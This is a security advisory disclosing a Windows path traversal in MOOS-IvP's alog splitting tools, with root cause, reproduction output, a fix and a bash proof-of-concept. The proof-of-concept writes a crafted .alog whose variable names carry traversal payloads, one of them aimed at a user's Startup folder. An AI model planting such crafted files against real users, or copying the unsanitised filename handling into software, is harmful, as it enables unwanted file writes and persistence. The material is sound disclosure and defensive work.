# MOOS-IvP: alog Splitting Path Traversal on Windows

- **Advisory ID:** MCSAID-2026-042
- **CVE ID:** [CVE-2026-85456](https://www.cve.org/CVERecord?id=CVE-2026-85456)
- **Published:** 2026-09-02
- **Severity:** Medium (CVSS 5.5 – CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)
- **CVSS 4.0:** 6.8 (CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N)
- **Vulnerability type:** Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- **Current state:** Fixed upstream in `main` by [Pull Request #137](https://github.com/moos-ivp/moos-ivp/pull/137) (merged 2026-09-11); not yet in a tagged release (latest release is v24.8.1)
- **Software:** [MOOS-IvP](https://github.com/moos-ivp/moos-ivp)
- **CWE:** [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- **Discovered by:** Vlatko Kosturjak of Marlink Cyber

---

## Summary

alog variable names are used directly as filenames after replacing only the forward slash. Backslashes, `..` segments, drive prefixes and Windows reserved device names all survive, so on Windows a crafted log file writes `.klog` files outside the split directory. On POSIX the forward-slash replacement contains the traversal, but nothing else is sanitised.

---

## Affected Versions

| Version | Status |
|---------|--------|
| moos-ivp <= 24.8.1 | Vulnerable |
| moos-ivp `main` from commit [`dcfad8c3380d`](https://github.com/moos-ivp/moos-ivp/commit/dcfad8c3380dac4ea48e3cd7ec65271b11aaf70d) | Fixed |

Tested against: MOOS-IvP `1de9ae146cd63c209e8c3fd81611a4ed2472971b`, latest master.

---

## Impact

Creation or append of `.klog` files anywhere the log-tool user can write - for
example a user's Startup folder.  Append mode plus the forced `.klog` suffix
limit this to appending attacker-controlled log text to a chosen path, so it is
a nuisance/persistence primitive rather than direct code execution.  Writing to
a device name can also hang or corrupt output.

---

## Exploitation

Whoever supplies the .alog file the operator splits or opens - a vehicle upload directory, a debrief bundle, a shared drive, a mailed tarball.

Preconditions:

* The log tool must run on **Windows**, where `\` is a path separator. On POSIX the forward-slash replacement contains the traversal and the backslashes become literal filename characters.
* Applies to alogsplit and to anything that constructs a SplitHandler (alogview, ALogDataBroker).

---

## Details

### Affected code

* **`ivp/src/lib_logutils/LogUtils.cpp`** - lines 61-85: getVarName() returns the second whitespace-delimited token of an .alog line verbatim - any bytes at all
* **`ivp/src/lib_logutils/SplitHandler.cpp`** - lines 186-189: varname = findReplace(varname, "/", "_");  - only the forward slash is neutralised
* **`ivp/src/lib_logutils/SplitHandler.cpp`** - lines 382-384: string new_file = m_basedir + "/" + varname + ".klog"; FILE *new_ptr = fopen(new_file.c_str(), "a");

### Root cause

Variable names in an .alog file are whatever the second field of the line
happens to be.  `SplitHandler` replaces `/` with `_` - a filesystem-hygiene
measure, not a security control - and then concatenates the name into a path and
`fopen`s it in append mode.  Backslashes, `..` segments, drive prefixes (`C:`)
and Windows reserved device names (`CON`, `NUL`, `COM1`) all pass through
untouched.  On Windows the result resolves outside the split directory.

---

## Reproduction

### Test environment

Ubuntu 24.04, x86-64, gcc 13.3.0, cmake 3.28.3, FLTK 1.3.8, Python 3.14.

All four MOOS repositories were built from source with their default settings -
Release `-O2`, and every resulting binary is a hardened PIE with a stack canary,
FORTIFY, NX and full RELRO:

| Repository | Version | Built with |
| --- | --- | --- |
| core-moos | `v10.4.0-49-gec9c77c` (`ec9c77c`) | `cmake .. && make` |
| essential-moos | `10.0.1-release-22-gb897ea8` (`b897ea8`) | `cmake -DMOOS_DIR=<core-moos build> .. && make` |
| ui-moos | commit `50b9c6c` | `cmake -DBUILD_GRAPHICAL_TOOLS=ON -DBUILD_UMS=ON -DMOOS_DIR=<core-moos build> .. && make` |
| MOOS-IvP | `1de9ae146cd63c209e8c3fd81611a4ed2472971b` | `./build-moos.sh && ./build-ivp.sh` |

This is MOOS-IvP specific code. It does not exist in core-moos, essential-moos or ui-moos, so MOOS-IvP is the only affected repository.

#### Tested / reproduced

Partly - the traversal itself needs Windows. Against the production `alogsplit` on Linux, the parser was shown to apply no sanitisation at all: four backslash-bearing filenames, a `C:` drive prefix and the reserved device names CON and NUL were all created verbatim; only the forward-slash case was neutralised.

### Steps and results

Run on Linux to show that no sanitisation happens (the traversal itself needs
Windows).  Given an .alog whose variable names are
`..\..\..\..\Windows\Temp\evil`, `C:\Windows\Temp\absolute`,
`..\..\sibling`, `../../posix_attempt` and `CON`, `alogsplit` created:

    ..\..\..\..\Users\Public\Startup\payload.bat.klog
    ..\..\..\..\Windows\Temp\evil.klog
    ..\..\sibling.klog
    C:\Windows\Temp\absolute.klog
    CON.klog
    .._.._posix_attempt.klog          <-- the '/' case, neutralised

i.e. four backslash-bearing names created verbatim, the drive prefix kept, the
device name accepted, and only the forward-slash case contained.

### Proof of concept

Standalone and self-contained - Python 3 standard library only (or a POSIX shell). It attacks an already-running production
binary and does **not** start the target itself; the launch
commands are in the header comment.

```bash
#!/bin/bash
# ============================================================================
# alog variable names used as filenames - path traversal on Windows
#
# ivp/src/lib_logutils/LogUtils.cpp:61-85
#     getVarName() returns the second whitespace-delimited token of an .alog
#     line VERBATIM - any bytes at all.
# ivp/src/lib_logutils/SplitHandler.cpp:186-189
#     varname = findReplace(varname, "/", "_");     # ONLY the forward slash
# ivp/src/lib_logutils/SplitHandler.cpp:382-384
#     string new_file = m_basedir + "/" + varname + ".klog";
#     FILE *new_ptr = fopen(new_file.c_str(), "a");
#
# Backslashes, ".." segments, drive prefixes ("C:") and Windows reserved device
# names (CON, NUL, COM1...) all pass through untouched.  On Windows the result
# resolves OUTSIDE the split directory.
#
# PLATFORM CAVEAT: the traversal itself needs Windows, where '\' is a path
# separator.  On POSIX the forward-slash replacement contains it and the
# backslashes become literal filename characters - which is exactly what this
# exploit demonstrates, because it proves the parser applies NO sanitisation to
# the input Windows would resolve as a path.
#
# TARGET
# ------
# alogsplit, and anything else that constructs a SplitHandler (alogview,
# ALogDataBroker), run on a log the attacker supplied.
#
# HOW TO LAUNCH THE TARGET (this exploit does NOT launch anything itself)
#     Nothing to launch - the victim runs the tool on the planted log.
#     Build:  cd /path/to/moos-ivp && ./build-ivp.sh
#     Victim: /path/to/moos-ivp/bin/alogsplit traversal.alog
#
# USAGE
# -----
#     ./exploit.sh [outdir] [--run-as-victim]
# ============================================================================
set -u
OUT=${1:-/tmp/alog-traversal-drop}
RUN=${2:-}
BIN=${BIN:-/path/to/moos-ivp/bin}

mkdir -p "$OUT"; cd "$OUT"

cat > traversal.alog <<'ALOG'
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% LOG FILE:       ./traversal.alog
%% FILE OPENED ON  Sat Jan  1 00:00:00 2022
%% LOGSTART        1640995200.00
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
0.000  DB_TIME                                        pMoosDB        1640995200
1.000  NAV_X                                          pNodeReporter  10
2.000  ..\..\..\..\Windows\Temp\evil                  pNodeReporter  1
3.000  ..\..\..\..\Users\Public\Startup\payload.bat   pNodeReporter  1
4.000  C:\Windows\Temp\absolute                       pNodeReporter  1
5.000  ..\..\sibling                                  pNodeReporter  1
6.000  ../../posix_attempt                            pNodeReporter  1
7.000  CON                                            pNodeReporter  1
8.000  NUL                                            pNodeReporter  1
ALOG

echo "[+] planted $OUT/traversal.alog"
echo "[+] the variable names (field 2) are the payload:"
grep -v '^%' traversal.alog | awk '{print "      " $2}'
echo
echo "[+] the victim runs the stock tool:"
echo "      \$ alogsplit traversal.alog"

if [ "$RUN" != "--run-as-victim" ]; then
  cat <<'EOT'

[*] --run-as-victim not given, so nothing was executed.  Hand traversal.alog to
    the victim, or re-run with --run-as-victim to see what happens.
EOT
  exit 0
fi

echo
echo "=== simulating the victim ==="
rm -rf traversal_alvtmp
"$BIN/alogsplit" traversal.alog 2>&1 | sed 's/^/      /' | head -8

DIR=traversal_alvtmp
echo
echo "[+] files created inside $DIR (printf %q so the escaping is unambiguous):"
if [ -d "$DIR" ]; then
  ( cd "$DIR" && ls -A1 | while IFS= read -r f; do
      printf '      %s\n' "$(printf '%q' "$f")"
    done )
else
  echo "      (split directory not created)"
fi

BS=$(ls -A "$DIR" 2>/dev/null | grep -c '\\' || true)
PX=$(ls -A "$DIR" 2>/dev/null | grep -c '\.\._\.\._' || true)
DEV=$(ls -A "$DIR" 2>/dev/null | grep -cE '^(CON|NUL)\.klog$' || true)
echo
echo "[+] interpretation"
echo "      backslash-bearing filenames created : $BS"
echo "      drive-prefixed filename created     : $(ls -A "$DIR" 2>/dev/null | grep -c '^C:' || true)"
echo "      reserved device names accepted      : $DEV"
echo "      forward-slash traversal neutralised : $PX  (turned into '_')"
echo
echo "      On Windows,"
echo "        fopen(\"<basedir>\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\Temp\\\\evil.klog\", \"a\")"
echo "      resolves outside <basedir> and creates or appends the file there."

cat <<'EOT'

====================================================================
IMPACT
  Creation or append of .klog files anywhere the log-tool user can write - for
  example a user's Startup folder.  Append mode plus the forced .klog suffix
  limit this to appending attacker-controlled log text to a chosen path, so it
  is a nuisance / persistence primitive rather than direct code execution.
  Writing to a device name can also hang or corrupt output.
  On POSIX the forward-slash replacement contains the traversal; what this
  demonstrates there is that NOTHING else is sanitised.
====================================================================
EOT

```

---

## Mitigations

Fixed upstream in the `main` branch; no tagged release containing the fix exists yet.

- Pull request: [Pull Request #137](https://github.com/moos-ivp/moos-ivp/pull/137) (merged 2026-09-11)
- Fix commit: [dcfad8c3380d](https://github.com/moos-ivp/moos-ivp/commit/dcfad8c3380dac4ea48e3cd7ec65271b11aaf70d)

### Recommended fix

Validate the variable name against a portable allow-list before using it as a
filename: accept `[A-Za-z0-9_.:-]` (the `:` is already used for detached keys),
reject both separators, reject any component that is `.` or `..`, reject drive
and UNC prefixes, reject Windows reserved device names, and cap the length.
Then verify with `std::filesystem::weakly_canonical` that the resulting path is
still under the split root before opening it.

---

## Recommendations

- Upgrade to a moos-ivp release that includes commit [`dcfad8c3380d`](https://github.com/moos-ivp/moos-ivp/commit/dcfad8c3380dac4ea48e3cd7ec65271b11aaf70d) once available, or build from `main` at or after that commit.
- Do not process alog files or pathnames from untrusted sources with the affected tools.

---

## Timeline

- 2026-09-02 – CVE-2026-85456 published
- 2026-09-11 – Fix merged upstream in [Pull Request #137](https://github.com/moos-ivp/moos-ivp/pull/137)
- 2026-10-13 – Marlink Cyber advisory released

---

## References

- CVE record: [CVE-2026-85456](https://www.cve.org/CVERecord?id=CVE-2026-85456)
- VulnCheck advisory: [MOOS-IvP through 24.8.1 alog Splitting Path Traversal on Windows](https://www.vulncheck.com/advisories/moos-ivp-through-24.8.1-alog-splitting-path-traversal-on-windows)
- Upstream pull request: [Pull Request #137](https://github.com/moos-ivp/moos-ivp/pull/137)
- Fix commit (PR head): [6f0619e905b325d6b88f76425673045c6e4f6f94](https://github.com/moos-ivp/moos-ivp/commit/6f0619e905b325d6b88f76425673045c6e4f6f94)
- Marlink Cyber Security Advisory: [MCSAID-2026-042](https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2026-042-moos-ivp-alog-splitting-path-traversal-on-windows.md)
- Merge commit: [dcfad8c3380dac4ea48e3cd7ec65271b11aaf70d](https://github.com/moos-ivp/moos-ivp/commit/dcfad8c3380dac4ea48e3cd7ec65271b11aaf70d)
- Software: [MOOS-IvP](https://github.com/moos-ivp/moos-ivp)
